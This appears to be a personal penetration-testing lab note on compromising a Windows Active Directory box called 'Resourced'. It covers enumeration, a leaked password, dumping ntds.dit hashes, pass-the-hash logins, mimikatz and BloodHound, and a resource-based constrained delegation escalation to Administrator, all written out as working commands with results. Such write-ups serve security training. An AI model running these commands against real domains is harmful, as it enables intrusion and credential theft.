@@ -1,0 +1,198 @@
+### Enumeration
+```
+IP=192.168.201.175
+sudo nmap -sU $IP
+sudo nmap -p- -vv $IP
+sudo nmap -p53,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49666,49668,49674,49674,49675,49695,49711 -A $IP
+nc -nvv -w 1 $IP 1-1000 2>&1 | grep -v 'Connection refused'
+```
+### Ports
+- Banner Grab: nc -nv $IP PORT
+- 53
+	- Simple DNS Plus
+- 88
+	- Microsoft Windows Kerberos
+- 135
+	- RPC
+- 139
+	- RPC
+- 389
+	- Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name) 
+- 445
+	- microsoft-ds
+- 464
+	- kpasswd5
+- 593
+	- HTTP RPC
+- 636
+	- tcpwrapped
+- 3268
+	- Microsoft Windows Active Directory LDAP (Domain: resourced.local0., Site: Default-First-Site-Name)
+- 3269
+	- tcpwrapped
+- 3389
+	- ms-wbt-server Microsoft Terminal Services
+- 5985
+	- winrm HTTP RPC
+- 9389
+	- .NET Message Framing
+- 49666
+	- RPC
+- 49668
+	- RPC
+- 49674
+	- RPC
+- 49675
+	- RPC
+- 49695
+	- RPC
+- 49711
+	- RPC
+### Foothold
+- RPC/ SMB
+	- enum4linux $IP
+		- Found list of users
+			- put into users.txt
+			- V.Ventz - Description:HotelCalifornia194!
+		- min pass len 7
+- 445
+	- smbclient -N -L //$IP
+		- login successful
+	- nmap --script smb-vuln* -p135,139,445 $IP
+		- No found exploits
+- Users
+	- Administrator
+	- Guest
+	- krbtgt
+	- M.Mason
+	- K.Keen
+	- L.Livingstone
+	- J.Johnson
+	- V.Ventz
+		- sudo crackmapexec smb $IP -u V.Ventz -p 'HotelCalifornia194!'
+			- Has access
+			- `resourced.local\V.Ventz
+	- S.Swanson
+	- P.Parker
+	- R.Robinson
+	- D.Durant
+	- G.Goldberg
+- V.Ventz
+	- sudo crackmapexec smb $IP -u V.Ventz -p 'HotelCalifornia194!' --shares
+		- Read
+			- IPC$
+			- NETLOGON
+			- Password Audit
+				- `smbclient '\\192.168.201.175\Password Audit' -U 'V.Ventz'
+					- Active Directory
+						- ntds.dit
+						- ntds.jfm
+					- registry
+						- SECURITY
+						- SYSTEM
+			- SYSVOL
+	- sudo impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+		- administrator:12579b1666d4ac10f0f59f300776495f
+			- crackstation - ItachiUchiha888
+			- tried crackmap smb and winrm
+				- login failed
+		- krbtgt:3004b16f88664fbebfcb9ed272b0565b
+		- M.Mason:3105e0f6af52aba8e11d19f27e487e45
+		- K.Keen:204410cc5a7147cd52a04ddae6754b0c
+		- L.Livingstone:19a3a7550ce8c505c2d46b5e39d6f808
+			- sudo crackmapexec smb $IP -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
+				- Successful
+			- sudo crackmapexec winrm $IP -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
+				- pwned
+				- evil-winrm -i $IP -u L.Livingstone -H '19a3a7550ce8c505c2d46b5e39d6f808'
+					- connected
+		- J.Johnson:3e028552b946cc4f282b72879f63b726
+		- S.Swanson:bd7c11a9021d2708eda561984f3c8939
+		- P.Parker:980910b8fc2e4fe9d482123301dd19fe
+		- R.Robinson:fea5a148c14cf51590456b2102b29fac
+		- D.Durant:08aca8ed17a9eec9fac4acdcb4652c35
+		- G.Goldberg:62e16d17c3015c47b4d513e65ca757a2
+		- Saying password expired when using hash
+	- sudo impacket-GetUserSPNs 'resourced.local/V.Ventz':'HotelCalifornia194!' -dc-ip $IP -request
+		- no entries found
+### PE
+#### Windows
+- `resourced\l.livingstone
+	- whoami /all
+		- Groups
+			- RDP
+		- Privs
+			- SeMachineAccountPrivilege enabled
+			- SeChangeNotifyPrivilege enabled
+			- SeIncreaseWorkingSetPrivilege enabled
+	- net user USERNAME
+		- Check group memberships
+	- systeminfo
+		- `./wes.py ~/OSCP/boxes/BOX_NAME/systeminfo.txt  > ~/OSCP/boxes/BOX_NAME/systeminfo_exploits.txt`
+		- access denied
+	- history
+		- (Get-PSReadLineOption).HistorySavePath
+	- Users with console
+		- same users as above
+	- Services
+		- PS1: `Get-Service | Select-Object -Property Name, DisplayName, Status
+		- Unquoted
+			- cmd
+				- `wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
+			- PS1
+				- Get-CimInstance -ClassName win32_service | Select Name,State,PathName
+					- access denied
+			- icacls Filepath before .exe
+				- Looking for W or F
+	- netstat -ano
+		- Active ports
+			- nothing new
+	- mimkatz
+		- wrinrm upload
+			- upload /home/kali/OSCP/exploits/windows/mimikatz/x64/mimikatz.exe
+		- mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit"
+			- no privs
+		- mimikatz.exe "privilege::debug" "token::elevate" "lsadump::sam" "exit"
+			- no privs
+	- Bloodhound
+		- ./SharpHound.exe -c All --zipfilename resourced
+		- `download C:\Users\L.Livingstone\20240809094820_resourced.zip homee/kali/OSCP/boxes/resource/20240809094820_resourced.zip
+		- Opened the files in bloodhound
+	- Resourced Delegation
+		- Get-DomainObject -Identity "dc=resourced,dc=local" -Domain resourced.local
+			- ms-ds-machineaccountquota is set to 10
+			- Means this is exploitable
+		- . ./Powermad.ps1
+		- `New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+			- Get-DomainComputer fake01
+				- Copy SID
+					- S-1-5-21-537427935-490066102-1511301751-4101
+			- ![[Pasted image 20240809112816.png]]
+		- Powerview exploit method
+			- `$ComputerSid = Get-DomainComputer fake01 -Properties objectsid | Select -Expand objectsid
+			- `$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+			- `$SDBytes = New-Object byte[] ($SD.BinaryLength)
+			- `$SD.GetBinaryForm($SDBytes, 0)
+			- `Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+			- `Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
+				- Returns: {1, 0, 4, 128...}
+			- ![[Pasted image 20240809113302.png]]
+		- After PowerView
+			- `.\Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:resourced.local
+			- `rubeus.exe s4u /user:FAKE01$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:resourced.local /ptt
+			- Test
+				- `ls \\victim.domain.local\C$
+			- RCE
+				- `PsExec.exe \\victim cmd
+		- Linux resource
+			- `impacket-addcomputer resourced.local/l.livingstone -dc-ip 192.168.200.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 -computer-name 'r4j3sh$' -computer-pass 'Rajesh@Mondal'
+			- `impacket-rbcd -action write -delegate-to "RESOURCEDC$" -delegate-from "r4j3sh$" -dc-ip 192.168.200.175 -hashes :19a3a7550ce8c505c2d46b5e39d6f808 resourced/l.livingstone
+			- `impacket-getST -spn cifs/resourcedc.resourced.local -impersonate Administrator resourced/r4j3sh\\$:'Rajesh@Mondal' -dc-ip $DC-IP
+				- ![[Pasted image 20240809131836.png]]
+			- klist
+				- ![[Pasted image 20240809131909.png]]
+			- Add $DCIP resourcedc.resourced.local  to /etc/hosts
+			- impacket-psexec -dc-ip 192.168.200.175 -k -no-pass resourcedc.resourced.local
+### Credentials
+- V.Ventz - Description:HotelCalifornia194!
+### Lessons Learned
